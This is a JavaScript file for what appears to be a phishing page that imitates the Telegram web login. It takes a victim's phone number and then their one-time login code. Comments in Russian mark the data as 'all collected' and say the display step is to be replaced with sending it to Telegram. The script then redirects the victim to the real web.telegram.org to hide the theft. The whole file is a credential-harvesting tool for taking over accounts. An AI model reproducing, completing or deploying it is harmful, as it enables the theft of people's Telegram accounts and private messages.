var userPhone = '';

function nextStep() {
    var countryCode = document.querySelector('.tg_country_code').value;
    var phoneNumber = document.querySelector('.tg_phone').value;
    
    if (!phoneNumber) {
        alert('Please enter your phone number');
        return;
    }
    
    userPhone = countryCode + phoneNumber;
    
    // Показываем введенный номер
    document.getElementById('phoneDisplay').textContent = userPhone;
    
    // Переключаем на шаг с кодом
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    
    console.log("Phone entered:", userPhone);
}

function submitCode() {
    var code = document.querySelector('.tg_code').value;
    
    if (!code) {
        alert('Please enter the code');
        return;
    }
    
    // ВСЕ ДАННЫЕ СОБРАНЫ!
    console.log("Full data - Phone:", userPhone, "Code:", code);
    
    // Показываем данные (замени на отправку в Telegram)
    alert("Login successful!\\nPhone: " + userPhone + "\\nCode: " + code);
    
    // Редирект на настоящий Telegram
    setTimeout(function() {
        window.location.href = "https://web.telegram.org/";
    }, 1500);
}
